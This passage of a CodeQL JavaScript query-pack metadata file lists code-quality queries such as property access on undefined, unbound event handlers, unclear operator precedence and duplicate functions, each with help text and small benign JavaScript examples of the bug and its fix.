      To fix this problem, `error` could be turned into a `let`-bound variable to avoid the accidental name capture:


      ```javascript
      function error(msg) {
        console.log(msg);
      }

      function processResponse(response) {
        if (response.status === 200) {
          let error = processResponseText(response.responseText);
          if (error)
             throw error;
        } else {
          error("Unexpected response status " + response.status);
        }
      }
      ```
      Alternatively, if ECMAScript 5 compatibility is desired, the `error` variable could be renamed instead, as in this example:


      ```javascript
      function error(msg) {
        console.log(msg);
      }

      function processResponse(response) {
        if (response.status === 200) {
          var err = processResponseText(response.responseText);
          if (err)
             throw err;
        } else {
          error("Unexpected response status " + response.status);
        }
      }
      ```

      ## References
      * Mozilla Developer Network: [Calling functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions#Calling_functions).
      * Common Weakness Enumeration: [CWE-476](https://cwe.mitre.org/data/definitions/476.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/SuspiciousPropAccess.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/SuspiciousPropAccess.bqrs
    metadata:
      name: Property access on null or undefined
      description: |-
        Trying to access a property of "null" or "undefined" will result
                      in a runtime exception.
      kind: problem
      problem.severity: error
      id: js/property-access-on-non-object
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-476
      precision: high
    queryHelp: |
      # Property access on null or undefined
      Attempting to read or write a property of `null` or `undefined` will cause an exception at runtime.


      ## Recommendation
      Carefully inspect the property access in question. If the problem was not detected during testing, this could either be because it is in dead code, or because it is not covered by a test. In the former case, delete the dead code in question. In the latter case, consider adding a new test.


      ## Example
      In the following example, function `f` declares a variable `result`, then invokes another function `computeInterestingResult` (not shown) and stores the result in `res`, and finally returns `result.value`. Since `result` has not been initialized, it will still have its default value `undefined`, causing a runtime exception.


      ```javascript
      function f() {
        var result;
        res = computeInterestingResult();
        return result.value;
      }
      ```
      The assignment to `res` is presumably a typo; instead, it should be assigned to `result`:


      ```javascript
      function f() {
        var result;
        result = computeInterestingResult();
        return result.value;
      }
      ```

      ## References
      * Mozilla Developer Network: [Objects and properties](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Working_with_Objects#Objects_and_properties).
      * Common Weakness Enumeration: [CWE-476](https://cwe.mitre.org/data/definitions/476.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/UnboundEventHandlerReceiver.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/UnboundEventHandlerReceiver.bqrs
    metadata:
      name: Unbound event handler receiver
      description:
        Invoking an event handler method as a function can cause a runtime
        error.
      kind: problem
      problem.severity: error
      id: js/unbound-event-handler-receiver
      tags: |-
        quality
               reliability
               correctness
      precision: high
    queryHelp: |
      # Unbound event handler receiver
      Event handler callbacks are usually invoked as functions, not as methods. This means that the `this` expressions of such callbacks evaluate to `undefined` or the global object. Using an ES6 class method as a callback therefore means that the `this` expressions of the method do not refer to the class instance.


      ## Recommendation
      Ensure that the receiver object of event handler methods that use `this` expressions is not `undefined`. For instance, you can use `bind` or explicitly invoke the method as a method call.


      ## Example
      The following example, for the React framework, registers the `handleClick` method as an event handler for the `click` event:


      ```javascript
      class Toggle extends React.Component {
        constructor(props) {
          super(props);
          this.state = {isToggleOn: true};
        }

        handleClick() {
          this.setState(prevState => ({
            isToggleOn: !prevState.isToggleOn
          }));
        }

        render() {
          return (
            <button onClick={this.handleClick}> // BAD `this` is now undefined in `handleClick`
              {this.state.isToggleOn ? 'ON' : 'OFF'}
            </button>
          );
        }
      }

      ```
      This is problematic since this invokes `handleClick` as a function call instead of a method call, meaning that `this` is `undefined` inside `handleClick`.

      Instead, bind the receiver of `handleClick` in the constructor:


      ```javascript
      class Toggle extends React.Component {
        constructor(props) {
          super(props);
          this.state = {isToggleOn: true};

          // This binding is necessary to make `this` work in the callback
          this.handleClick = this.handleClick.bind(this);
        }

        handleClick() {
          this.setState(prevState => ({
            isToggleOn: !prevState.isToggleOn
          }));
        }

        render() {
          return (
            <button onClick={this.handleClick}> // GOOD, the constructor binds `handleClick`
              {this.state.isToggleOn ? 'ON' : 'OFF'}
            </button>
          );
        }
      }

      ```

      ## References
      * React Quick Start: [Handling Events](https://reactjs.org/docs/handling-events.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/UnclearOperatorPrecedence.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/UnclearOperatorPrecedence.bqrs
    metadata:
      name: Unclear precedence of nested operators
      description: |-
        Nested expressions involving binary bitwise operators and comparisons are easy
                      to misunderstand without additional disambiguating parentheses or whitespace.
      kind: problem
      problem.severity: recommendation
      id: js/unclear-operator-precedence
      tags: |-
        quality
               maintainability
               readability
               statistical
               non-attributable
               external/cwe/cwe-783
      precision: very-high
    queryHelp: |
      # Unclear precedence of nested operators
      Nested expressions that rely on less well-known operator precedence rules can be hard to read and understand. They could even indicate a bug where the author of the code misunderstood the precedence rules.


      ## Recommendation
      Use parentheses or additional whitespace to clarify grouping.


      ## Example
      Consider the following snippet of code:


      ```javascript
      if (x & y == 0) {
        // ...
      }
      ```
      It might look like this tests whether `x` and `y` have any bits in common, but in fact `==` binds more tightly than `&`, so the test is equivalent to `x & (y == 0)`.

      If this is the intended interpretation, parentheses should be used to clarify this. You could also consider adding extra whitespace around `&` or removing whitespace around `==` to make it visually apparent that it binds less tightly: `x & y==0`.

      Probably the best approach in this case, though, would be to use the `&&` operator instead to clarify the intended interpretation: `x && y == 0`.


      ## References
      * Mozilla Developer Network, [Operator precedence](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence).
      * Common Weakness Enumeration: [CWE-783](https://cwe.mitre.org/data/definitions/783.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/UnknownDirective.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/UnknownDirective.bqrs
    metadata:
      name: Unknown directive
      description: An unknown directive has no effect and may indicate a misspelling.
      kind: problem
      problem.severity: warning
      id: js/unknown-directive
      tags: |-
        quality
               reliability
               correctness
      precision: high
    queryHelp: |
      # Unknown directive
      If a directive is accidentally misspelled, it will have no effect.


      ## Recommendation
      Correct the misspelling.


      ## Example
      The following code snippet shows a function that contains a `"usestrict"` directive. Most likely, the programmer intended this to be a `"use strict"` directive, but due to the typo, the function will not execute in strict mode.


      ```javascript
      function f() {
          "usestrict";
          ...
      }

      ```
      Correct the misspelling by replacing `"usestrict"` with `"use strict"`.


      ## References
      * Mozilla Developer Network: ["use strict"](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode)
      * asm.js: ["use asm"](http://asmjs.org/spec/latest/#validation)
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/UnneededDefensiveProgramming.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/UnneededDefensiveProgramming.bqrs
    metadata:
      name: Unneeded defensive code
      description:
        Defensive code that guards against a situation that never happens
        is not needed.
      kind: problem
      problem.severity: recommendation
      id: js/unneeded-defensive-code
      tags: |-
        quality
               maintainability
               useless-code
               external/cwe/cwe-570
               external/cwe/cwe-571
      precision: very-high
    queryHelp: |
      # Unneeded defensive code
      Defensive code can prevent unforeseen circumstances from causing fatal program behaviors. A common defensive code pattern is to guard against dereferencing the values `null` or `undefined`. However, if the situation that some defensive code guards against never can occur, then the defensive code serves no purpose and can safely be removed.


      ## Recommendation
      Examine the surrounding code to determine if the defensive code is worth keeping despite providing no practical use. If it is no longer needed, remove it.


      ## Example
      The following example shows a `cleanupLater` function that asynchronously will perform a cleanup task after some delay. When the cleanup task completes, the function invokes the provided callback parameter `cb`. To prevent a crash by invoking `cb` when it has the value `undefined`, defensive code guards the invocation by checking if `cb` is truthy.


      ```javascript
      function cleanupLater(delay, cb) {
          setTimeout(function() {
              cleanup();
              if (cb) { // BAD: useless check, `cb` is always truthy
                  cb();
              }
          }, delay)
      }

      cleanupLater(1000, function(){console.log("Cleanup done")});

      ```
      However, the `cleanupLater` function is always invoked with a callback argument, so the defensive code condition always holds, and it is therefore not required. The function can therefore be simplified to:


      ```javascript
      function cleanupLater(delay, cb) {
          setTimeout(function() {
              cleanupNow();
              // GOOD: no need to guard the invocation
              cb();
          }, delay)
      }

      cleanupLater(function(){console.log("Cleanup done")});

      ```
      Guarding against the same situation multiple times is another example of defensive code that provides no practical use. The example below shows a function that assigns a value to a property of an object, where defensive code ensures that the assigned value is not `undefined` or `null`.


      ```javascript
      function setSafeStringProp(o, prop, v) {
          // BAD: `v == null` is useless
          var safe = v == undefined || v == null? '': v;
          o[prop] = safe;
      }

      ```
      However, due to coercion rules, `v == undefined` holds for both the situation where `v` is`undefined` and the situation where `v` is`null`, so the `v == null` guard serves no purpose, and can be removed:


      ```javascript
      function setSafeStringProp(o, prop, v) {
          // GOOD: `v == undefined` handles both `undefined` and `null`
          var safe = v == undefined? '': v;
          o[prop] = safe;
      }

      ```

      ## References
      * Wikipedia: [Defensive programming](https://en.wikipedia.org/wiki/Defensive_programming).
      * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).
      * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/WhitespaceContradictsPrecedence.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/WhitespaceContradictsPrecedence.bqrs
    metadata:
      name: Whitespace contradicts operator precedence
      description: |-
        Nested expressions where the formatting contradicts the grouping enforced by operator precedence
                      are difficult to read and may even indicate a bug.
      kind: problem
      problem.severity: warning
      id: js/whitespace-contradicts-precedence
      tags: |-
        quality
               reliability
               correctness
               statistical
               non-attributable
               external/cwe/cwe-783
      precision: very-high
    queryHelp: |
      # Whitespace contradicts operator precedence
      Nested expressions where the spacing around operators suggests a different grouping than that imposed by the JavaScript operator precedence rules are problematic: they could indicate a bug where the author of the code misunderstood the precedence rules. Even if there is no a bug, the spacing could be confusing to people who read the code.


      ## Recommendation
      Make sure that the spacing around operators reflects operator precedence, or use parentheses to clarify grouping.


      ## Example
      Consider the following piece of code for allocating an array:


      ```javascript
      var a = new Array(capacity + capacity>>1);
      ```
      Here, the spacing around `+` and `>>` suggests the grouping `capacity + (capacity>>1)`, that is, the allocated array should be 50% larger than the given capacity.

      However, `+` has higher precedence than `>>`, so this code allocates an array of size `(capacity + capacity) >> 1`, which is the same as `capacity`.

      To fix this issue, parentheses should be used like this:


      ```javascript
      var a = new Array(capacity + (capacity>>1));
      ```

      ## References
      * J. Bloch and N. Gafter, *Java Puzzlers: Traps, Pitfalls, and Corner Cases*, Puzzle 35. Addison-Wesley, 2005.
      * Common Weakness Enumeration: [CWE-783](https://cwe.mitre.org/data/definitions/783.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: external/DuplicateFunction.ql
    relativeBqrsPath: codeql/javascript-queries/external/DuplicateFunction.bqrs
    metadata:
      deprecated: ''
      name: Duplicate function
      description: |-
        There is another function that shares a lot of code with this function.
                      Extract the common parts to a shared utility function to improve maintainability.
      kind: problem
      problem.severity: recommendation
      id: js/duplicate-function
      tags: |-
        testability
               useless-code
               maintainability
               statistical
               non-attributable
               duplicate-code
      precision: medium
    queryHelp: |
      # Duplicate function
      Duplicate functions with identical or very similar bodies indicate poorly structured code that is hard to maintain. The artificially inflated amount of code hinders comprehension, and ranges of similar but subtly different lines can mask the real purpose or intention behind a function. Duplicate functions can also suffer from update anomalies, where only one of several copies of the code is updated to address a defect or add a feature, causing them to slowly evolve apart.

      In some cases, duplicate functions can also indicate a bug where a function was copied with the aim of changing it in some way, but the programmer then forgot to perform the intended change.


      ## Recommendation
      At its simplest, function duplication can be addressed by removing all but one of the duplicate function definitions and making callers of the removed functions refer to the (now canonical) single remaining definition instead.

      If two functions are mostly, but not completely, identical, it is often possible to factor out the common functionality into a new function. This improves reusability and resolves the code duplication.


      ## References
      * Elmar Juergens, Florian Deissenboeck, Benjamin Hummel, and Stefan Wagner. 2009. Do code clones matter? In *Proceedings of the 31st International Conference on Software Engineering* (ICSE '09). IEEE Computer Society, Washington, DC, USA, 485-495.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: external/DuplicateToplevel.ql
    relativeBqrsPath: codeql/javascript-queries/external/DuplicateToplevel.bqrs
    metadata:
      deprecated: ''
      name: Duplicate script
      description: |-
        There is another script that shares a lot of code with this script. Consider combining the
                      two scripts to improve maintainability.
      kind: problem
      problem.severity: recommendation
      id: js/duplicate-script
      tags: |-
        testability
               maintainability
               useless-code
               statistical
               non-attributable
               duplicate-code
      precision: medium
    queryHelp: |
      # Duplicate script
      Duplicate scripts with identical or very similar contents indicate poorly structured code that is hard to maintain. The artificially inflated amount of code hinders comprehension, and ranges of similar but subtly different lines can mask the real purpose or intention behind a function. Duplicate scripts can also suffer from update anomalies, where only one of several copies of the code is updated to address a defect or add a feature, causing them to slowly evolve apart.


      ## Recommendation
      Usually, script duplication can be addressed by removing all but one of the duplicates and including the (now canonical) single remaining script wherever the other scripts were previously used.

      If the scripts are mostly, but not completely, identical, it is often possible to factor out the common functionality into a new script. This improves reusability and resolves the code duplication.


      ## References
      * Elmar Juergens, Florian Deissenboeck, Benjamin Hummel, and Stefan Wagner. 2009. Do code clones matter? In *Proceedings of the 31st International Conference on Software Engineering* (ICSE '09). IEEE Computer Society, Washington, DC, USA, 485-495.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: external/SimilarFunction.ql
    relativeBqrsPath: codeql/javascript-queries/external/SimilarFunction.bqrs
    metadata:
      deprecated: ''
      name: Similar function
      description: |-
        There is another function that shares a lot of code with this function.
                      Extract the common parts to a shared utility function to improve maintainability.
      kind: problem
      problem.severity: recommendation
      id: js/similar-function
      tags: |-
        testability
               maintainability
               useless-code
               statistical
               non-attributable
               duplicate-code
      precision: medium
    queryHelp: |
      # Similar function
      Duplicate functions with identical or very similar bodies indicate poorly structured code that is hard to maintain. The artificially inflated amount of code hinders comprehension, and ranges of similar but subtly different lines can mask the real purpose or intention behind a function. Duplicate functions can also suffer from update anomalies, where only one of several copies of the code is updated to address a defect or add a feature, causing them to slowly evolve apart.

      In some cases, duplicate functions can also indicate a bug where a function was copied with the aim of changing it in some way, but the programmer then forgot to perform the intended change.


      ## Recommendation
      At its simplest, function duplication can be addressed by removing all but one of the duplicate function definitions and making callers of the removed functions refer to the (now canonical) single remaining definition instead.

      If two functions are mostly, but not completely, identical, it is often possible to factor out the common functionality into a new function. This improves reusability and resolves the code duplication.


      ## References
      * Elmar Juergens, Florian Deissenboeck, Benjamin Hummel, and Stefan Wagner. 2009. Do code clones matter? In *Proceedings of the 31st International Conference on Software Engineering* (ICSE '09). IEEE Computer Society, Washington, DC, USA, 485-495.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: external/SimilarToplevel.ql
    relativeBqrsPath: codeql/javascript-queries/external/SimilarToplevel.bqrs
    metadata:
      deprecated: ''
      name: Similar script
      description: |-
        There is another script that shares a lot of code with this script.
                      Extract the common parts to a new script to improve maintainability..
      kind: problem
      problem.severity: recommendation
      id: js/similar-script
      tags: |-
        testability
               maintainability
               useless-code
               statistical
               non-attributable
               duplicate-code
      precision: medium
    queryHelp: |
      # Similar script
      Duplicate scripts with identical or very similar contents indicate poorly structured code that is hard to maintain. The artificially inflated amount of code hinders comprehension, and ranges of similar but subtly different lines can mask the real purpose or intention behind a function. Duplicate scripts can also suffer from update anomalies, where only one of several copies of the code is updated to address a defect or add a feature, causing them to slowly evolve apart.


      ## Recommendation
      Usually, script duplication can be addressed by removing all but one of the duplicates and including the (now canonical) single remaining script wherever the other scripts were previously used.

      If the scripts are mostly, but not completely, identical, it is often possible to factor out the common functionality into a new script. This improves reusability and resolves the code duplication.


      ## References
      * Elmar Juergens, Florian Deissenboeck, Benjamin Hummel, and Stefan Wagner. 2009. Do code clones matter? In *Proceedings of the 31st International Conference on Software Engineering* (ICSE '09). IEEE Computer Society, Washington, DC, USA, 485-495.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: filters/ClassifyFiles.ql
    relativeBqrsPath: codeql/javascript-queries/filters/ClassifyFiles.bqrs
    metadata:
      name: Classify files
      description: |-
        This query produces a list of all files in a snapshot
                      that are classified as generated code, test code,
                      externs declarations, library code or template code.
      kind: file-classifier
      id: js/file-classifier
  - pack: codeql/javascript-queries#0
    relativeQueryPath: JSDoc/BadParamTag.ql
    relativeBqrsPath: codeql/javascript-queries/JSDoc/BadParamTag.bqrs
    metadata:
      name: Bad param tag
      description: |-
        A 'param' tag that does not include a name is confusing since it is unclear which
                      parameter it is meant to document. A 'param' tag that does not include a
                      description is useless and should be removed.
      kind: problem
      problem.severity: recommendation
      id: js/jsdoc/malformed-param-tag
      tags: |-
        maintainability
               readability
               documentation
      precision: low
    queryHelp:
      "# Bad param tag\nJSDoc comments for functions and constructors should\
      \ use the `@param` tag to describe the available parameters. Each `@param` tag\
      \ should include both the name of the documented parameter and a description of\
      \ its meaning and use. A missing name or description makes the tag much less useful\
      \ and may indicate badly maintained code.\n\n\n## Recommendation\nAdd the missing\
      \ items to the `@param` tag.\n\n\n## Example\nIn the following example, the constructor\
      \ `Message` has a JSDoc comment containing two `@param` tags for its two parameters,\
      \ both of which are missing descriptions.\n\n\n```javascript\n/**\n * A message.\n\
      \ *\n * @constructor\n * \n * @param title\n * @param text\n */\nfunction Message(title,\
      \ body) {\n    this.title = title;\n    this.body = body;\n}\n```\n\n## References\n\
      * Use JSDoc: [The @param tag](http://usejsdoc.org/tags-param.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: JSDoc/JSDocForNonExistentParameter.ql
    relativeBqrsPath: codeql/javascript-queries/JSDoc/JSDocForNonExistentParameter.bqrs
    metadata:
      name: JSDoc tag for non-existent parameter
      description: |-
        A JSDoc 'param' tag that refers to a non-existent parameter is confusing
                      and may indicate badly maintained code.
      kind: problem
      problem.severity: recommendation
      id: js/jsdoc/unknown-parameter
      tags: |-
        maintainability
               readability
               documentation
      precision: low
    queryHelp:
      "# JSDoc tag for non-existent parameter\nJSDoc comments for functions\
      \ and constructors should use the `@param` tag to describe the available parameters.\
      \ Wrong or outdated parameter names in `@param` tags make the documentation difficult\
      \ to read, and may indicate badly maintained code.\n\n\n## Recommendation\nThe\
      \ parameter names should be corrected. If the documented parameter was removed,\
      \ its corresponding `@param` tag should also be removed.\n\n\n## Example\nIn the\
      \ following example, the constructor `Message` has a JSDoc comment containing\
      \ two `@param` tags, one documenting the parameter `title`, and one documenting\
      \ a non-existent parameter `text`.\n\n\n```javascript\n/**\n * A message.\n *\n\
      \ * @constructor\n * \n * @param {string} title The title of the message.\n *\
      \ @param {string} text  The body text of the message.\n */\nfunction Message(title,\
      \ body) {\n    this.title = title;\n    this.body = body;\n}\n```\nAssuming that\
      \ `text` was the previous name of the parameter `body`, the second `@param` should\
      \ be updated to refer to the parameter `body` instead.\n\n\n## References\n* Use\
      \ JSDoc: [The @param tag](http://usejsdoc.org/tags-param.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: JSDoc/UndocumentedParameter.ql
    relativeBqrsPath: codeql/javascript-queries/JSDoc/UndocumentedParameter.bqrs
    metadata:
      name: Undocumented parameter
      description: |-
        If some parameters of a function are documented by JSDoc 'param' tags while others
                      are not, this may indicate badly maintained code.
      kind: problem
      problem.severity: recommendation
      id: js/jsdoc/missing-parameter
      tags: |-
        maintainability
               readability
               documentation
      precision: low
    queryHelp:
      "# Undocumented parameter\nJSDoc comments for functions and constructors\
      \ should use the `@param` tag to describe all available parameters. If documentation\
      \ for some parameters is missing, this may indicate badly maintained code.\n\n\
      \n## Recommendation\nThe missing `@param` tags should be added.\n\n\n## Example\n\
      In the following example, the constructor `Message` has a JSDoc comment with a\
      \ `@param` tag documenting its first parameter `title`, but no tag for its second\
      \ parameter `body`.\n\n\n```javascript\n/**\n * A message.\n *\n * @constructor\n\
      \ * \n * @param {string} title The title of the message.\n */\nfunction Message(title,\
      \ body) {\n    this.title = title;\n    this.body = body;\n}\n```\n\n## References\n\
      * Use JSDoc: [The @param tag](http://usejsdoc.org/tags-param.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/ArgumentsCallerCallee.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/ArgumentsCallerCallee.bqrs
    metadata:
      name: Use of arguments.caller or arguments.callee
      description: |-
        The properties 'arguments.caller' and 'argument.callee' have subtle semantics and
                      make code non-modular and hard to maintain. Consequently, they should not be used.
      kind: problem
      problem.severity: recommendation
      id: js/call-stack-introspection
      tags: |-
        maintainability
               language-features
      precision: medium
    queryHelp:
      "# Use of arguments.caller or arguments.callee\nThe `arguments.callee`\
      \ property can be used to access the currently executing function, while the non-standard\
      \ `arguments.caller` property provides access to its caller. Using these properties\
      \ makes code hard to read, however, so they should be avoided.\n\n\n## Recommendation\n\
      Instead of using `arguments.callee`, you can refer to the enclosing function by\
      \ its name (possibly giving it a name first if it is an anonymous function expression).\
      \ Uses of `arguments.caller` can often be eliminated by refactoring the program.\n\
      \n\n## Example\nIn the following example, `arguments.callee` is used to recursively\
      \ invoke the enclosing function, which is anonymous.\n\n\n```javascript\n(function\
      \ (i) {\n\tif (i <= 1)\n\t\treturn 1;\n\treturn i*arguments.callee(i-1);\n}(3));\n\
      \n```\nTo avoid this use, the function can be given a name and referred to using\
      \ that name:\n\n\n```javascript\n(function factorial(i) {\n\tif (i <= 1)\n\t\t\
      return 1;\n\treturn i*factorial(i-1);\n}(3));\n\n```\n\n## References\n* Mozilla\
      \ Developer Network: [arguments](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions_and_function_scope/arguments).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/BadTypeof.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/BadTypeof.bqrs
    metadata:
      name: Useless type test
      description: |-
        Comparing the result of a typeof test against a string other than 'undefined',
                      'boolean', 'number', 'string', 'object', 'function' or 'symbol' is useless, since
                      this comparison can never succeed.
      kind: problem
      problem.severity: error
      id: js/useless-type-test
      tags: |-
        quality
               reliability
               correctness
               language-features
               external/cwe/cwe-570
               external/cwe/cwe-571
      precision: very-high
    queryHelp:
      "# Useless type test\nIn ECMAScript 5, the `typeof` operator returns\
      \ one of the following six type tags: `\"undefined\"`, `\"boolean\"`, `\"number\"\
      `, `\"string\"`, `\"object\"`, `\"function\"`. In ECMAScript 2015, it may additionally\
      \ return `\"symbol\"`, while on older versions of Internet Explorer it may return\
      \ `\"unknown\"` or `\"date\"` in certain situations. Comparing it against any\
      \ other string literal is therefore useless.\n\n\n## Recommendation\nCarefully\
      \ examine the comparison in question. If the type tag is simply misspelled, correct\
      \ it. In some cases, the type tag returned by `typeof` is not sufficiently precise,\
      \ so you may have to use other type test functions.\n\n\n## Example\nThe following\
      \ code snippet tries to determine whether `a` is an array:\n\n\n```javascript\n\
      if (typeof a === 'array')\n\tconsole.log(\"It's an array!\");\n```\nNote that\
      \ `typeof` is not precise enough to distinguish arrays from other objects, since\
      \ it returns the type tag `\"object\"` for both. ECMAScript 5-compatible platforms\
      \ provide a library function `Array.isArray` that can be used instead:\n\n\n```javascript\n\
      if (Array.isArray(a))\n\tconsole.log(\"It's an array!\");\n```\nOn older platforms,\
      \ you can use the technique explained on the [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/isArray#Compatibility).\n\
      \n\n## References\n* Mozilla Developer Network: [typeof](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof).\n\
      * Mozilla Developer Network: [Array.isArray()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/isArray).\n\
      * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).\n\
      * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/ConditionalComments.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/ConditionalComments.bqrs
    metadata:
      name: Conditional comments
      description: Conditional comments are an IE-specific feature and not portable.
      kind: problem
      problem.severity: warning
      id: js/conditional-comment
      tags: |-
        quality
               reliability
               correctness
               portability
               language-features
               external/cwe/cwe-758
      precision: very-high
    queryHelp: |
      # Conditional comments
      Conditional comments are only supported in Internet Explorer and should be avoided for portability.


      ## Recommendation
      Use feature detection (as offered by major frameworks such as [jQuery](http://jquery.com)) instead.


      ## Example
      The following code snippet uses conditional comments to detect whether it is running on Internet Explorer 9 or newer. A better alternative would be to directly check for the desired features using, for instance, jQuery's `$.support` object.


      ```javascript
      /*@cc_on
        @if (@_jscript_version >= 6)
          console.log("You're running a new version of IE.");
        @else
          console.log("You're running an old version of IE.");
        @end
        @*/

      ```
      Note that conditional comments are no longer supported in Internet Explorer 11 Standards mode.


      ## References
      * Internet Explorer Dev Center: [@cc_on Statement (JavaScript)](http://web.archive.org/web/20121103072038/http://msdn.microsoft.com/en-us/library/ie/8ka90k2e(v=vs.94).aspx).
      * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/DebuggerStatement.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/DebuggerStatement.bqrs
    metadata:
      name: Use of debugger statement
      description: The 'debugger' statement should not be used in production code.
      kind: problem
      problem.severity: recommendation
      id: js/debugger-statement
      tags: |-
        efficiency
               maintainability
               language-features
               external/cwe/cwe-489
      precision: medium
    queryHelp:
      "# Use of debugger statement\nThe `debugger` statement should only be\
      \ used during debugging, and should not appear in production code.\n\n\n## Recommendation\n\
      Remove all `debugger` statements.\n\n\n## Example\nThe following implementation\
      \ of Quicksort contains a `debugger` statement which can be removed without affecting\
      \ the program's functionality.\n\n\n```javascript\nfunction qsort(a) {\n    if\
      \ (a.length == 0) return [];\n \n    var left = [], right = [], pivot = a[0];\n\
      \ \n    for (var i = 1; i < a.length; i++) {\n    \tdebugger;\n        a[i] <\
      \ pivot ? left.push(a[i]) : right.push(a[i]);\n    }\n \n    return qsort(left).concat(pivot,\
      \ qsort(right));\n}\n```\n\n## References\n* Mozilla Developer Network: [The debugger\
      \ statement](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/debugger).\n\
      * Common Weakness Enumeration: [CWE-489](https://cwe.mitre.org/data/definitions/489.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/DeleteVar.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/DeleteVar.bqrs
    metadata:
      name: Deleting non-property
      description:
        The operand of the 'delete' operator should always be a property
        accessor.
      kind: problem
      problem.severity: warning
      id: js/deletion-of-non-property
      tags: |-
        quality
               reliability
               correctness
               language-features
               external/cwe/cwe-480
      precision: very-high
    queryHelp:
      "# Deleting non-property\nThe `delete` operator should only be used to\
      \ delete properties from objects. Using it to delete variables makes code hard\
      \ to maintain and will break in strict mode.\n\n\n## Recommendation\nIf the variable\
      \ you are deleting is a global variable, this is a sign that your code relies\
      \ too much on global state. Try encapsulating this global state by means of one\
      \ of the module patterns introduced in *JavaScript: The Good Parts*.\n\n\n## Example\n\
      In the following code snippet, `delete` is used to clean up the global `cache`\
      \ variable used by function `get`.\n\n\n```javascript\nvar cache;\n\nfunction\
      \ init() {\n\tcache = {};\n}\n\nfunction done() {\n\tdelete cache;\n}\n\nfunction\
      \ get(k) {\n\tk = '$' + k;\n\tif (!cache.hasOwnProperty(k))\n\t\tcache[k] = compute(k);\n\
      \treturn cache[k];\n}\n\nfunction compute(k) {\n\t// compute value for k\n\t//\
      \ ...\n}\n```\nIt would be clearer to wrap the whole module into a closure like\
      \ this (which also avoids exposing function `compute` to the outside world):\n\
      \n\n```javascript\n(function(global) {\n\tvar cache;\n\n\tglobal.init = function\
      \ init() {\n\t\tcache = {};\n\t};\n\n\tglobal.done = function done() {\n\t};\n\
      \n\tglobal.get = function get(k) {\n\t\tk = '$' + k;\n\t\tif (!cache.hasOwnProperty(k))\n\
      \t\t\tcache[k] = compute(k);\n\t\treturn cache[k];\n\t}\n\n\tfunction compute(k)\
      \ {\n\t\t// compute value for k\n\t\t// ...\n\t}\n}(this));\n```\n\n## References\n\
      * JSLint Error Explanations: [Only properties should be deleted](http://jslinterrors.com/only-properties-should-be-deleted).\n\
      * Common Weakness Enumeration: [CWE-480](https://cwe.mitre.org/data/definitions/480.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/EmptyArrayInit.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/EmptyArrayInit.bqrs
    metadata:
      name: Omitted array element
      description:
        Omitted elements in array literals are easy to miss and should not
        be used.
      kind: problem
      problem.severity: recommendation
      id: js/omitted-array-element
      tags: |-
        maintainability
               readability
               language-features
      precision: low
    queryHelp: |
      # Omitted array element
      Elements of array literal expressions that are omitted will be initialized to `undefined`. However, such omitted elements are easy to miss and make code hard to read. They should be avoided.


      ## Recommendation
      Explicitly initialize the array elements to `undefined`. If you want to create an array with a specific number of uninitialized elements, use the `Array` constructor instead.


      ## Example
      The following code snippet initializes `a` to an array of size ten by using omitted elements.


      ```javascript
      var a = [,,,,,,,,,,];
      ```
      This code is clearly hard to read, and should be replaced by the following snippet:


      ```javascript
      var a = new Array(10);
      ```

      ## References
      * D. Crockford, *JavaScript: The Good Parts*, Appendix C.6. O'Reilly, 2008.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/Eval.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/Eval.bqrs
    metadata:
      name: Use of eval
      description: |-
        The 'eval' function and the 'Function' constructor execute strings as code. This is dangerous and impedes
